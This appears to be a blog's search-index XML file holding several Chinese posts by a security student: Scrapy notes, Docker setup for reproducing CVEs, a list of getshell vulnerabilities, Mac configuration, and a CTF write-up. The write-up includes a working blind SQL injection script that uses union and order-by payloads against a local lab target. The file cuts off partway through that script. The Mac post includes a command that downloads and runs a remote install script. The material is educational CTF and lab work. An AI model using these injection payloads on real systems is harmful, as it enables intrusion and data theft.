<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[How to Spider faster and faster]]></title>
      <url>/2018/04/24/Scrapy-Efficiency/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>最近一直”不务正业“，研究爬虫。。然后研究到Spider的效率问题时，就遇到了一些麻烦。。。本来这些东西也可以整合在Exercise那篇文章里的，但是觉得单独开篇，能凸显它的重要性～<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p>何为异步？何为多线程？何为多进程？</p>
<h2 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h2><p>Asyncio模块，等把Scrapy弄懂再学一下自己写高效的爬虫</p>
<h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><blockquote>
<p>I/O密集等待时间过多采取多线程</p>
<blockquote>
<p>所谓IO密集型任务，是指磁盘IO、网络IO占主要的任务，计算量很小。比如请求网页、读写文件等。当然我们在Python中可以利用sleep达到IO密集型任务的目的。</p>
</blockquote>
</blockquote>
<p>可用：</p>
<ol>
<li><strong>thread</strong>模块_thread，提供低等级接口</li>
<li><strong>threading</strong>模块，提供更容易使用的基于对象的接口，可以继承Thread对象来实现线程，此外其还提供了其它线程相关的对象，例如Timer，Lock等。</li>
</ol>
<h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><blockquote>
<p>计算密集采取多进程充分利用CPU多核心优势</p>
<blockquote>
<p>所谓计算密集型任务，是指CPU计算占主要的任务，CPU一直处于满负荷状态。比如在一个很大的列表中查找元素（当然这不合理），复杂的加减乘除等。</p>
</blockquote>
</blockquote>
<p>可用：mutliprocess模块，提供了很多容易使用的基于对象的接口。另外它提供了封装好的管道和队列，可以方便的在进程间传递消息。Python还提供了进程池Pool对象，可以方便的管理和控制线程。</p>
<p><strong>参考资料</strong></p>
<p><a href="https://zhuanlan.zhihu.com/p/24283040" target="_blank" rel="noopener">Python进阶：聊聊IO密集型任务、计算密集型任务，以及多线程、多进程</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/24118476?refer=pythoner" target="_blank" rel="noopener">Python进阶：理解Python中的异步IO和协程(Coroutine)，并应用在爬虫中</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/24469566" target="_blank" rel="noopener">拥有属于自己的Python爬虫框架–练习编写多线程、协程爬虫框架！</a></p>
<p><a href="http://www.cnblogs.com/zhaof/tag/%E7%88%AC%E8%99%AB/" target="_blank" rel="noopener">一位大佬关于爬虫的系列教程</a></p>
</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Scrapy Warm-Up]]></title>
      <url>/2018/04/17/Scrapy-Exercises/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>小组爬虫项目一步一步按计划进行，翻译也提上了日程，先看一遍Scrapy 1.5的官方文档热热身先 <strong>:)</strong></p>
<p>翻译文档到时会统一整合到gitbook上！这里只分享一些自己用Scrapy的练习～</p>
<p>～实践是检验真理的唯一标准～<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<h2 id="Novel"><a href="#Novel" class="headerlink" title="Novel"></a>Novel</h2><h3 id="单线程"><a href="#单线程" class="headerlink" title="单线程"></a>单线程</h3><p>先写个简单的没有JS异步加载的爬小说吧！</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79ly1fqlwxssc65j31kw0quqdk.jpg" width="50%"></p>
<p>关键点在于用选择器来定位你要爬的内容。。单单在这一点上，我就觉得Scrapy比BeautifulSoup方便不知道多少倍了。。因为Scrapy的shell简直是神器，手动测试=&gt;精准定位=&gt;直接复制=&gt;bingo！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chapter = response.xpath(<span class="string">"//div[@class='bookname']/h1/text()"</span>).extract()</span><br><span class="line">content = response.xpath(<span class="string">"//div[@id='content']/text()"</span>).extract()</span><br><span class="line">next_page = response.xpath(<span class="string">"//div[@class='bottem']/a/@href"</span>)[<span class="number">3</span>].extract()</span><br></pre></td></tr></table></figure>
<p>至于如何储存提取的数据，那就根据需求来选择就好了。可以选择python的写入文件，也可以存储在json、jl里面。</p>
<p>但是，这种单线程爬取，实在是太慢了。。。对于上千上万的请求。。怕是要挂一晚上哦～～</p>
<p>所以，继续阅读文档，再学一波多线程爬取。。那就perfect啦！</p>
<h3 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h3><p>暂时如果不跳出Scrapy的限制的话，可能只能同时启动多个spider来实现效率上的提升吧？</p>
<h2 id="爬图片"><a href="#爬图片" class="headerlink" title="爬图片"></a>爬图片</h2><p><a href="https://doc.scrapy.org/en/latest/topics/item-pipeline.html#process_item" target="_blank" rel="noopener"><code>process_item()</code></a> </p>
</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浅谈SQL盲注]]></title>
      <url>/2018/04/05/sql-blind/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>总结一下自己应对SQL Injection盲注的姿势与和对原理的理解。<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<h2 id="BooleanBase"><a href="#BooleanBase" class="headerlink" title="BooleanBase"></a>BooleanBase</h2><h3 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h3><h3 id="DNSLOG"><a href="#DNSLOG" class="headerlink" title="DNSLOG"></a>DNSLOG</h3><h2 id="TimeBase"><a href="#TimeBase" class="headerlink" title="TimeBase"></a>TimeBase</h2><h2 id="ErrorBase"><a href="#ErrorBase" class="headerlink" title="ErrorBase"></a>ErrorBase</h2></the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Rapid Recurrence Of CVEs]]></title>
      <url>/2018/04/03/rapid-recurrence/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>从彭锅踩过的Docker坑中，学习一下快速复现CVE环境<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p>Docker的学习总结在另外一篇<a href="http://karmaof.me/2018/03/30/Docker-Learning/" target="_blank" rel="noopener">博客</a>中，若需，自取。</p>
<p>这里只总结一下彭锅的经验和自己的坑～～</p>
<h2 id="基本环境"><a href="#基本环境" class="headerlink" title="基本环境"></a>基本环境</h2><h3 id="安装docker"><a href="#安装docker" class="headerlink" title="安装docker"></a>安装docker</h3><p>这里就不写教程了，因为。。。mac下，只需要从官网下好一个dmg，傻瓜式安装完之后。。啥都给你配置好了。。还省去了一些麻烦的命令行操作。</p>
<h3 id="准备lamp环境壳子"><a href="#准备lamp环境壳子" class="headerlink" title="准备lamp环境壳子"></a>准备lamp环境壳子</h3><p>这里是照搬彭锅的套路</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># tutum/lamp 是个人感觉最方便的lamp  docker镜像</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载镜像</span></span><br><span class="line">docker pull tutum/lamp</span><br><span class="line"><span class="comment"># 运行一个tutum/lamp环境，其中-e参数是给数据库的admin用户设置密码</span></span><br><span class="line">docker <span class="keyword">run</span><span class="bash"> -d --name base -p 80:80 -e MYSQL_PASS=<span class="string">"密码"</span> tutum/lamp</span></span><br><span class="line"><span class="bash"><span class="comment"># 进入命令行交互界面</span></span></span><br><span class="line"><span class="bash">docker <span class="built_in">exec</span> -ti base /bin/bash</span></span><br><span class="line"><span class="bash"><span class="comment"># 升级源，之后就能使用apt-get install去安装软件了</span></span></span><br><span class="line"><span class="bash">apt-get update</span></span><br><span class="line"><span class="bash"><span class="comment"># 目前认为基本的一些软件</span></span></span><br><span class="line"><span class="bash">apt-get install -y vim unzip wget curl</span></span><br><span class="line"><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># 删除根目录下的文件</span></span></span><br><span class="line"><span class="bash"><span class="built_in">cd</span> /var/www/html </span></span><br><span class="line"><span class="bash">rm *</span></span><br><span class="line"><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># 退出容器</span></span></span><br><span class="line"><span class="bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="bash"></span></span><br><span class="line"><span class="bash"><span class="comment"># 保存镜像</span></span></span><br><span class="line"><span class="bash">docker commit -p base lamp_base</span></span><br><span class="line"><span class="bash"><span class="comment"># 如果不需要在另外一个及其中复现环境，下面这里一般用不着</span></span></span><br><span class="line"><span class="bash">docker save -o ~/lamp_base.tar lamp_base</span></span><br><span class="line"><span class="bash">docker load -i ~/container-backup.tar</span></span><br></pre></td></tr></table></figure>
<h3 id="Show-time"><a href="#Show-time" class="headerlink" title="Show time"></a>Show time</h3><p>做好一个壳子之后，你以后需要复现什么cve，只需要，以壳子为基础，然后自由发挥，调整各种参数，就完全欧几里得了～～</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name 容器名 -p 8001:80 -e MYSQL_PASS=&quot;密码&quot; lamp_base</span><br><span class="line">docker exec -ti 容器名 /bin/bash</span><br></pre></td></tr></table></figure>
<p>关键点就是把源码传到容器的/var/www/html文件夹中，可以从主机cp过去，也可以直接在容器中下载。</p>
<p>然后就只需要看源码文件夹里readme，自行修改参数，根据步骤安装即可。</p>
</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> CMS Recurrence </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Get Shell ->  Get Root]]></title>
      <url>/2018/03/17/getshell/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>Get Shell -&gt;  Get Root 的心路历程<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<h1 id="易导致Getshell的漏洞"><a href="#易导致Getshell的漏洞" class="headerlink" title="易导致Getshell的漏洞"></a>易导致Getshell的漏洞</h1><h2 id="前台"><a href="#前台" class="headerlink" title="前台"></a>前台</h2><h3 id="Typecho反序列化"><a href="#Typecho反序列化" class="headerlink" title="Typecho反序列化"></a>Typecho反序列化</h3><h3 id="缓存漏洞"><a href="#缓存漏洞" class="headerlink" title="缓存漏洞"></a>缓存漏洞</h3><h2 id="后台"><a href="#后台" class="headerlink" title="后台"></a>后台</h2><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="b2evolution"><a href="#b2evolution" class="headerlink" title="b2evolution"></a>b2evolution</h4><p>同样需要登陆管理员之后才能进行上传操作，自动化写shell的用处不大，所以就没有写脚本了。</p>
<h4 id="Monstra-CMS"><a href="#Monstra-CMS" class="headerlink" title="Monstra CMS"></a>Monstra CMS</h4><h4 id="VehicleWorkshop"><a href="#VehicleWorkshop" class="headerlink" title="VehicleWorkshop"></a>VehicleWorkshop</h4><p>无任何过滤，造成任意文件上传</p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p><strong>一定要把Linux学好 :(</strong></p>
<h4 id="PlaySMS-1-4"><a href="#PlaySMS-1-4" class="headerlink" title="PlaySMS 1.4"></a>PlaySMS 1.4</h4><p>这里的文件上传不会保存到服务器中，只是把文件的名字（去掉后缀）读取出来，从而造成命令执行，但我始终没有找到办法写入shell（由于没有权限），有空再回头研究研究</p>
<h4 id="BanManager-WebUI"><a href="#BanManager-WebUI" class="headerlink" title="BanManager WebUI"></a>BanManager WebUI</h4><p>更新footer、before buttons和after buttons的时候，没有过滤敏感符号，如 <strong>‘</strong>  <strong>//</strong> 等等，更没有检查敏感操作，造成闭合前面的 <strong>‘</strong> 造成代码注入，进而getshell。但是这个洞，从理论上是可以实现自动化写shell的，但是。。模拟登陆的地方好像出了些小毛病，也没有完全解决。。</p>
</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> Shell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Mac Personal Settings]]></title>
      <url>/2018/03/16/Mac-Personal-Settings/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>实在是受不了开着个虚拟机，顶着高温来复现环境之类的了。。花了一下午，配置了各种环境。<br>然后。。物理机被我折腾的乱七八糟。。然后就重装系统了～～老老实实用docker。。<br><a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p>有些教程来自<a href="http://lucifaer.com/index.php/archives/10/" target="_blank" rel="noopener">Lucifaer</a>学长～～然后自己还踩了一些坑～</p>
<h2 id="Softwares"><a href="#Softwares" class="headerlink" title="Softwares"></a>Softwares</h2><ol>
<li>分屏软件：Hyperdock，appstore有的下（虽然要钱）/或者Moom</li>
<li>Shadowsocks～～必备的咯</li>
<li>没用MWeb之前，我用的是轻量md编辑器：Typora</li>
<li>Dash</li>
<li>浏览器：Chrome（插件舒服） + Firefox（不得不用）</li>
<li>IDE：JetBrains系列</li>
</ol>
<h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><h3 id="homebrew"><a href="#homebrew" class="headerlink" title="homebrew"></a>homebrew</h3><p>这个东西，一般都是必装的:)</p>
<h3 id="Item2-Oh-My-Zsh"><a href="#Item2-Oh-My-Zsh" class="headerlink" title="Item2+Oh-My-Zsh"></a>Item2+Oh-My-Zsh</h3><p>其实装完之后我觉得，除了好看点，没啥区别。就是拿来养眼～～偷懒的。。。</p>
<h4 id="安装ITem2"><a href="#安装ITem2" class="headerlink" title="安装ITem2"></a>安装ITem2</h4><p>首先我们下载的 iTem2 这个软件，比Mac自带的终端更加强大。直接官网 <a href="http://iterm2.com/" target="_blank" rel="noopener">http://iterm2.com/</a> 下载并安装即可。</p>
<h4 id="设置为默认终端"><a href="#设置为默认终端" class="headerlink" title="设置为默认终端"></a>设置为默认终端</h4><p>将iTem2设置为默认终端：<br>（菜单栏）iTerm2 -&gt; Make iTerm2 Default Term<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fpf3b0lk8ej30es0lctd5.jpg" width="50%"></p>
<h4 id="配色、文字"><a href="#配色、文字" class="headerlink" title="配色、文字"></a>配色、文字</h4><p>Preferences -&gt; Profiles -&gt; Colors/Text<br>根据自己的喜好调整颜色和文字。。solarized dark是item2一装上就内置的，只需要自己选就可以了<img src="https://ws4.sinaimg.cn/large/006tKfTcly1fpf3e16hcjj30rk0n446p.jpg" width="50%"></p>
<h4 id="安装-oh-my-zsh"><a href="#安装-oh-my-zsh" class="headerlink" title="安装 oh-my-zsh"></a>安装 oh-my-zsh</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c &quot;$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&quot;</span><br></pre></td></tr></table></figure>
<h4 id="换主题"><a href="#换主题" class="headerlink" title="换主题"></a>换主题</h4><p>用vim 打开隐藏文件 <strong>.zshrc</strong>，修改主题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME=&quot;agnoster&quot;</span><br><span class="line">之后还要下载一个字体，否则会出现乱码：</span><br><span class="line">$ brew install git //先装个git</span><br><span class="line">$ git clone https://github.com/powerline/fonts.git</span><br><span class="line">$ cd fonts</span><br><span class="line">$ ./install.sh</span><br></pre></td></tr></table></figure>
<h4 id="插件-语法高亮"><a href="#插件-语法高亮" class="headerlink" title="插件-语法高亮"></a>插件-语法高亮</h4><p>直接使用homebrew安装zsh-syntax-highlighting插件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install zsh-syntax-highlighting</span><br></pre></td></tr></table></figure>
<p>然后在根目录下.zshrc中插入下面内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</span><br></pre></td></tr></table></figure>
<p>最后重启一下ITem2就ok啦<img src="https://ws1.sinaimg.cn/large/006tKfTcly1fpf3ja95uoj30kw02sgm7.jpg" alt=""></p>
<blockquote>
<p><a href="https://www.jianshu.com/p/246b844f4449" target="_blank" rel="noopener">最漂亮（ iTerm2+oh-my-zsh配色）</a><br><a href="https://xiaozhou.net/learn-the-command-line-iterm-and-zsh-2017-06-23.html" target="_blank" rel="noopener">程序员内功系列–iTerm与Zsh篇</a><br><a href="https://www.jianshu.com/p/da7728a8a4d7" target="_blank" rel="noopener">iterm2使用快捷键</a></p>
</blockquote>
<h3 id="git"><a href="#git" class="headerlink" title="git"></a>git</h3><p>这个搭Blog的时候就已经需要用到了，轻松clone下别人的代码来研究。</p>
<h3 id="Python2-3"><a href="#Python2-3" class="headerlink" title="Python2+3"></a>Python2+3</h3><p>系统自带一个2.7的python，但是太。。。难用了～～所以安利两种方法处理多版本的问题</p>
<ol>
<li>一个好用的软件<a href="https://foofish.net/compatible-py2-and-py3.html" target="_blank" rel="noopener">Anaconda</a></li>
<li>用brew重新装两个Python，然后用不同的命令来运行，但是，我觉得还是没有Anaconda好用。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 brew install python    </span><br><span class="line">//python2与python3的pip指令并不通用，安装包时需要分别安装</span><br><span class="line">$ proxychains4 brew install python3</span><br></pre></td></tr></table></figure>
<p>需要注意的使用的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python --version    //源生自带版本</span><br><span class="line">Python 2.7.10</span><br><span class="line">$ python2 --version    //刚刚brew的版本</span><br><span class="line">Python 2.7.13</span><br><span class="line">$ python3 --version    //brew install python3</span><br><span class="line">Python 3.6.0</span><br></pre></td></tr></table></figure>
<h3 id="Apache-PHP-MySql"><a href="#Apache-PHP-MySql" class="headerlink" title="Apache+PHP+MySql"></a>Apache+PHP+MySql</h3><p>这里我直接贴学长的文章了。。因为这里我自己踩了很多坑，找了很多paper才搞定。。<br><a href="http://lucifaer.com/index.php/archives/11/" target="_blank" rel="noopener">Mac OS Sierra 配置 PHP 开发与漏洞分析环境</a><br><a href="https://zhuanlan.zhihu.com/p/24614926" target="_blank" rel="noopener">在 MacOS Sierra 上安装 Apache 和多个版本的 PHP</a></p>
<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p><a href="https://segmentfault.com/a/1190000013131276" target="_blank" rel="noopener">Mac配置多个Java版本</a></p>
<h3 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h3><h3 id="Sublime-Text-3"><a href="#Sublime-Text-3" class="headerlink" title="Sublime Text 3"></a>Sublime Text 3</h3><p>网上有很多教程。我就不写自己怎么弄的了。还有很多插件。。。<br><a href="http://chaishiwei.com/blog/892.html" target="_blank" rel="noopener">Sublime Text 3 for Mac 安装和插件配置说明</a><br><a href="https://blog.csdn.net/lin111000713/article/details/51757298" target="_blank" rel="noopener">CTags</a><br><a href="https://www.jianshu.com/p/b3d10ae1ecba" target="_blank" rel="noopener">在Mac下用Sublime Text3 架设C开发环境和报错分析</a></p>
</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> Mac </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[复现Pwnhub会员日的一道题]]></title>
      <url>/2018/03/13/%E5%A4%8D%E7%8E%B0Pwnhub%E4%BC%9A%E5%91%98%E6%97%A5/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>这几天复现了一下 Pwnhub会员日 的一道题。<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p>一开始创表和字段的时候自信的自己创。。然后发现出问题了。。然后。。就老老实实的“自带”的代码。。然后就ojbk了～～</p>
<p>这道题涉及了太多太多原先我并不知道的东西，所以仔细思考下来，还是收获了很多新姿势～</p>
<p>面对一开始的login界面，<img src="https://ws4.sinaimg.cn/large/006tNc79ly1fpcmdthln0j30eu0pg0tq.jpg" width="50%"><br>测试了半天，发现没有注入点，然后不知道怎么进行下一步，就很懵逼～</p>
<h2 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h2><p>对于一个没有丰富ctf经验的小白来说。。就真的不知道要用扫描器这个神奇的东西～～后来发现thisisourcecode，就赶紧download下来审计一波～～<img src="https://ws1.sinaimg.cn/large/006tNc79ly1fpcmr2wbazj308u0bmjs3.jpg" width="50%">就只有几个php，根据代码审计老套路～寻找可控点～捋清楚逻辑</p>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>profile.php 中有一个注入点<img src="https://ws3.sinaimg.cn/large/006tNc79ly1fpcmt0stvpj30qk06275h.jpg" alt="">但是。。过滤了我认为最重要的()，这就很难受了。。因为这样子，我该如何注入啊？？</p>
<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p>要想拿到flag，<br>1.就要拿到$secrect<img src="https://ws1.sinaimg.cn/large/006tKfTcly1fpcrxzb723j30k4068t9p.jpg" alt="">因为兑换码是一个“str_shuffle“的随机字符串</p>
<blockquote>
<p><a href="http://php.net/manual/zh/function.str-shuffle.php" target="_blank" rel="noopener">str_shuffle</a><br>但是要值得注意的是，这个函数是将字符串用伪随机的方式打乱，也就是一个字母用了一次之后，就不会再用第二次，我们可以利用<img src="https://ws2.sinaimg.cn/large/006tKfTcly1fpdihqenxrj31kw0ajmza.jpg" alt="">这个东西也是做了这套题为才知道的～～</p>
</blockquote>
<p>2.就要爆破出验证码<br><img src="https://ws1.sinaimg.cn/large/006tKfTcly1fpcsd2if6fj30qe02q3z6.jpg" alt=""></p>
<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><h4 id="SQL注入-1"><a href="#SQL注入-1" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>要找出36位的兑换码不难，难得是<img src="https://ws3.sinaimg.cn/large/006tKfTcly1fpdiamtvsij30tq0pcq7n.jpg" alt="">他还限制了次数，超过了140次，就重置掉，所以。。傻瓜式遍历，肯定行不通～～这对一个虽然学过二分法，但是不知道怎么用python来实现的freshman来说，好像是有点残忍～～然后感谢彭锅(Ph0rse)给的思路～再去找了些<a href="http://www.cnblogs.com/yupeng/p/3418293.html" target="_blank" rel="noopener">资料</a>，似乎搞懂了。。<br>虽然我们要找到数据库中的兑换码，但是，兑换码在哪一列？不知道，而且过滤了()，也就意味着不能用mysql的一系列函数，来爆破列名（废话，要是能爆列名，还要盲注干嘛 :D )。<br>于是又从彭锅那里学到一招：<img src="https://ws3.sinaimg.cn/large/006tKfTcgy1fpflp5fpe1j315y0qc1gr.jpg" alt=""><br>手动测试一下，回显位是第二位，果然是这样的。。所以就可以开始写脚本了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备工作</span></span><br><span class="line">url = <span class="string">"﻿http://localhost/pwnhub/profile.php"</span></span><br><span class="line">cookies = &#123;<span class="string">"PHPSESSID"</span>:<span class="string">"630v0vodvk3f2muj14cohfld80"</span>&#125;</span><br><span class="line">payload = &#123;<span class="string">'id'</span>:<span class="string">'1'</span>&#125;</span><br><span class="line">string = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">str = <span class="string">''</span></span><br><span class="line">url = rq.get(url,cookies=cookies, params=payload)</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line">print(url.url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> i &lt;= <span class="number">36</span>:</span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = len(string)<span class="number">-1</span></span><br><span class="line">    print(<span class="string">'problem:'</span>)</span><br><span class="line">    print(right)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> right - left == <span class="number">1</span>:</span><br><span class="line">        poc = url.url +<span class="string">' union select 1,2,3,\''</span>+str+string[right]+<span class="string">'\',5 order by 4 limit 0,1--+'</span></span><br><span class="line">        target = rq.get(poc,cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'KarmA'</span> <span class="keyword">in</span> target.text:</span><br><span class="line">            str = str + string[left]</span><br><span class="line">            str = str + string[right]</span><br><span class="line">            print(str)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            str = str + string[right]</span><br><span class="line">            str = str + string[left]</span><br><span class="line">            print(str)</span><br><span class="line">            exit()</span><br><span class="line">    <span class="comment"># 二分法</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        mid = int((left + right)) / <span class="number">2</span></span><br><span class="line">        poc = url.url + <span class="string">' union select 1,2,3,\''</span>+str+string[mid]+<span class="string">'\',5 order by 4 limit 0,1--+'</span></span><br><span class="line">        print(poc)</span><br><span class="line">        target = rq.get(poc,cookies=cookies)</span><br><span class="line">        print(target.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'KarmA'</span> <span class="keyword">in</span> target.text:</span><br><span class="line">            right = mid - <span class="number">1</span> <span class="comment"># 左半部</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid <span class="comment"># 右半部</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> left == right: <span class="comment">#中值</span></span><br><span class="line">            str = str + string[left]</span><br><span class="line">            string = string.replace(string[left],<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> right - left == <span class="number">1</span>: <span class="comment"># 特殊情况，如不处理，会导致死循环</span></span><br><span class="line">            poc = url.url +<span class="string">' union select 1,2,3,\''</span>+str+string[right]+<span class="string">'\',5 order by 4 limit 0,1--+'</span></span><br><span class="line">            target = rq.get(poc, cookies=cookies)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'KarmA'</span> <span class="keyword">in</span> target.text:</span><br><span class="line">                str = str + string[left]</span><br><span class="line">                string = string.replace(string[left],<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                str = str + string[right]</span><br><span class="line">                string = string.replace(string[right],<span class="string">''</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    i += <span class="number">1</span></span><br><span 